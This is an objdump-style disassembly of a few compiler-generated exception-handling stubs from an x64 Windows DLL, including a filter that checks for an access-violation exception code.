   180002586:	8a 4d 20             	mov    0x20(%rbp),%cl
   180002589:	e8 e6 f9 ff ff       	call   0x180001f74
   18000258e:	90                   	nop
   18000258f:	48 83 c4 20          	add    $0x20,%rsp
   180002593:	5d                   	pop    %rbp
   180002594:	c3                   	ret
   180002595:	cc                   	int3
   180002596:	40 55                	rex push %rbp
   180002598:	48 83 ec 20          	sub    $0x20,%rsp
   18000259c:	48 8b ea             	mov    %rdx,%rbp
   18000259f:	48 83 c4 20          	add    $0x20,%rsp
   1800025a3:	5d                   	pop    %rbp
   1800025a4:	e9 57 f8 ff ff       	jmp    0x180001e00
   1800025a9:	cc                   	int3
   1800025aa:	40 55                	rex push %rbp
   1800025ac:	48 83 ec 30          	sub    $0x30,%rsp
   1800025b0:	48 8b ea             	mov    %rdx,%rbp
   1800025b3:	48 8b 01             	mov    (%rcx),%rax
   1800025b6:	8b 10                	mov    (%rax),%edx
   1800025b8:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1800025bd:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1800025c1:	4c 8d 0d 94 f2 ff ff 	lea    -0xd6c(%rip),%r9        # 0x18000185c
   1800025c8:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   1800025cc:	8b 55 68             	mov    0x68(%rbp),%edx
   1800025cf:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1800025d3:	e8 98 f7 ff ff       	call   0x180001d70
   1800025d8:	90                   	nop
   1800025d9:	48 83 c4 30          	add    $0x30,%rsp
   1800025dd:	5d                   	pop    %rbp
   1800025de:	c3                   	ret
   1800025df:	cc                   	int3
   1800025e0:	40 55                	rex push %rbp
   1800025e2:	48 8b ea             	mov    %rdx,%rbp
   1800025e5:	48 8b 01             	mov    (%rcx),%rax
   1800025e8:	33 c9                	xor    %ecx,%ecx
   1800025ea:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   1800025f0:	0f 94 c1             	sete   %cl
   1800025f3:	8b c1                	mov    %ecx,%eax
   1800025f5:	5d                   	pop    %rbp
   1800025f6:	c3                   	ret
   1800025f7:	cc                   	int3
